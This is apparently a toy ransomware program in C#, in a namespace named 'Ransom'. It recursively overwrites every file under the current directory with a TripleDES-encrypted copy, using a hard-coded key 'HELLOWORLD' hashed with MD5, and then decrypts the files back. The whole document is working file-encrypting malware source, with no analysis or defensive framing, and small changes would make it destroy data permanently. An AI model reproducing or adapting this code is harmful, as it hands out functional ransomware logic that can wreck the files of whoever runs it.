using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Ransom
{
    class Program
    {
        public const string key = "HELLOWORLD";

        private static TripleDESCryptoServiceProvider desCryptoProvider = new TripleDESCryptoServiceProvider();
        private static MD5CryptoServiceProvider hashMD5Provider = new MD5CryptoServiceProvider();

        private static void DirectorySearchENC(string dir)
        {
                foreach (string f in Directory.GetFiles(dir))
                {
                    try
                    {
                        File.WriteAllBytes(Path.GetFullPath(f), Encrypt(File.ReadAllBytes(Path.GetFullPath(f)), Encoding.ASCII.GetBytes(key)));
                        Console.WriteLine("[ENC] " + Path.GetFileName(f));
                    } catch (Exception es)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[EXC] " + Path.GetFileName(f)+ " -> " + es.GetType());
                        Console.ForegroundColor = ConsoleColor.DarkCyan;
                        continue;
                    }
                }
                foreach (string d in Directory.GetDirectories(dir))
                {
                    DirectorySearchENC(d);
                }
        }
        private static void DirectorySearchDEC(string dir)
        {
                foreach (string f in Directory.GetFiles(dir))
                {
                    try
                    {
                    File.WriteAllBytes(Path.GetFullPath(f), Decrypt(File.ReadAllBytes(Path.GetFullPath(f)), Encoding.ASCII.GetBytes(key)));
                    Console.WriteLine("[DEC] " + Path.GetFileName(f));
                    }
                    catch (Exception es)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[EXC] " + Path.GetFileName(f) + " -> " + es.GetType());
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        continue;
                    }
                }
                foreach (string d in Directory.GetDirectories(dir))
                {
                    DirectorySearchDEC(d);
                }
        }
        private static byte[] Encrypt(byte[] source, byte[] key)
        {
            desCryptoProvider.Key = hashMD5Provider.ComputeHash(key);
            desCryptoProvider.Mode = CipherMode.CBC;
            return desCryptoProvider.CreateEncryptor().TransformFinalBlock(source, 0, source.Length);
        }
        private static byte[] Decrypt(byte[] encodedText, byte[] key)
        {
            desCryptoProvider.Key = hashMD5Provider.ComputeHash(key);
            desCryptoProvider.Mode = CipherMode.CBC;
            return desCryptoProvider.CreateDecryptor().TransformFinalBlock(encodedText, 0, encodedText.Length);
        }

        static void Main(string[] args)
        {
            string h = Directory.GetCurrentDirectory();
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("####################_ENCRYPTING_####################");
            DirectorySearchENC(h);

            Console.WriteLine("####################DONE_ENCRYPTING####################");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("####################_DECRYPTING_####################");

            DirectorySearchDEC(h);

            Console.WriteLine("####################DONE_DECRYPTING####################");
            Console.ResetColor();
            System.Threading.Thread.Sleep(2000);
        }
    }
}
